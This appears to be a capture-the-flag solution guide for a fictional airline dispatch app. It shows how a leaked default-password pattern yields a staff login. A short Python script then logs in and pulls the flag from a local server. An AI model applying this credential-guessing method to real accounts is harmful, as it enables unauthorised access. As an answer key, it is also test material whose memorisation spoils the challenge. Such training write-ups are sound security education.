# A07 Easy: Solution Guide

### Vulnerability Mechanics
1. Browse to `/crew-roster` to inspect the operations roster. Marcus Vance has username `m.vance`, home base `LAX`, operational role `Chief Flight Dispatcher`, and joined in `Fall 2023`.
2. Browse to `/bulletins` to inspect security directive `SEC-2024-09`:
   - "All accounts created before 2024 still retain temporary passwords matching `[AirportCode]![Season][Year]` (e.g. `JFK!Spring2023`)."
3. Applying the formula for `m.vance` (Base: `LAX`, Joined: `Fall 2023`):
   - `Password: LAX!Fall2023`
4. Log into `/login` with:
   - Username: `m.vance`
   - Password: `LAX!Fall2023`
5. Navigate to `/dispatch/manifest/classified` to view the diplomatic manifest and retrieve the dynamic flag `RTSA{...}`.

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6019"

session = requests.Session()
# Login
resp = session.post(f"{BASE_URL}/login", data={
    "username": "m.vance",
    "password": "LAX!Fall2023"
})
assert resp.status_code == 200 or resp.history

# Retrieve manifest
manifest_resp = session.get(f"{BASE_URL}/dispatch/manifest/classified")
flag = re.search(r"RTSA\{[^}]+\}", manifest_resp.text).group(0)
print(f"[+] Flag: {flag}")
```
